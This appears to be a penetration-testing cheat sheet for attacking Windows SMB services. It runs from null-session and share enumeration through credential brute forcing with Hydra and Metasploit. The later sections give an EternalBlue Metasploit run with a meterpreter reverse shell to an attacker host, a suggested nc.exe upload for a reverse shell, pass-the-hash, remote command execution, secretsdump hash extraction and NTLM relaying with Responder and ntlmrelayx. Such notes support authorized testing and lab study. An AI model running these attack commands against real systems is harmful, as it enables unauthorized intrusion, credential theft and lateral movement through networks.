```table-of-contents
```

!!! tip "Start here"
    First check: `netexec smb <target> -u '' -p ''` (null session). If that fails, try `guest:guest`. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.

## Enumeration
### Check for Availability
```bash
nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode,smb2-capabilities $IP
```

CrackMapExec:
```bash
crackmapexec smb $IP
```
Provides quick system information, user enumeration, and SMB version detection.

Validate username/password:
```bash
crackmapexec smb $IP -u users.txt -p "Password"
```
## Listing Shares Anonymously
```bash
smbclient -L //$IP --option="client min protocol=core" -U '' 
```
## List SMB Shares
Unsure of login credentials:
```bash
smbclient -L //$IP -U guest
```

* If prompted for a password, try an empty password, `guest`, or `anonymous`

```bash
nmap --script smb-enum-shares -p 445 $IP
```

Below is a special case use. This will take care of shares with spaces in the name, users on a different domain (for AD), and using a valid username/password:
```bash
smbclient -L "//192.168.243.175/My Share" -U "DOMAIN/username%password"
```
## Enum4linux
```bash
enum4linux -a $IP
```
- `-a`: Runs all enumeration options (users, shares, password policies, etc.).
- `-G`: Grabs group membership from the target.
- `-o`: Output the results to a file.
- `-i`: Information about the target system (OS version).

## Enum4linux-ng
The next-generation version of enum4linux. Provides similar output, however, both should be used in parallel:
```bash
enum4linux-ng -A $IP
```
## Null Sessions
Attempt to connect to any null sessions of specific shares:
```bash
smbclient //10.0.0.0/SHARE -N
```
## Enumerate SMB Users
### Using Enum4Linux
```bash
enum4linux -U $IP
```
## Brute Force SMB Credentials
CrackMapExec:
```bash
crackmapexec smb $IP -u users.txt -p passwords.txt
```

Hydra:
```bash
hydra -L users.txt -P passwords.txt smb://$IP -V
```

Metasploit:
```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Downloading Content
Single file:
```bash
smb> get file
```

Directory:
```bash
smb> mget *
```

## Exploiting Misconfigurations
### Anonymous Login
First, check to see if anonymous login is allowed. If any public shares are found, we can use the following to log in:
```bash
smbclient //$IP/SHARE -U guest
```

### EternalBlue (MS17-010)
Check for vulnerability:
```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
```

If present, follow instructions below:
https://github.com/3ndG4me/AutoBlue-MS17-010

Or, if available, use MSF:
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

### SMBGhost (CVE-2020-0796)
Check for vulnerability:
```bash
nmap -p 445 --script smb-vuln-cve-2020-0796 $IP
```

If present, follow instructions below:
https://github.com/jamf/CVE-2020-0796-RCE-POC
### Upload a Malicious File
Assuming we have write access to the SMB, we could obtain a reverse shell by uploading `nc.exe` for example into the share, then start a NC listener on the attacking machine.

## Post-Exploitation & Lateral Movement
### Pass-the-Hash (Pth)
If we've gained NTLM credentials, we can try a PtH attack:
```bash
crackmapexec smb $IP -u Administrator -H <NTLM-hash>
```

OR using Impacket's SMBExec:
```bash
impacket-smbexec <DOMAIN>/<user>@$IP -hashes :<NTLM-hash>
```
### Enumerating SMB Shares & Users
```bash
crackmapexec smb $IP --shares
```
### RCE via SMB
If an administrator account is compromised:
```bash
crackmapexec smb $IP -u admin -p password --exec "whoami"
```

### Extracting Password Hashes
Retrieve NTLM hashes from SMB:
```bash
secretsdump.py <domain>/<user>@$IP
```

## Relay Attack
Use Responder and Impacket’s ntlmrelayx to relay authentication requests, potentially gaining immediate access to SMB or other services:

Start responder:
```
responder -I eth0 -rdwv
```

SMB Relay Attack (with Impacket):
```
ntlmrelayx.py -tf targets.txt -smb2support
```

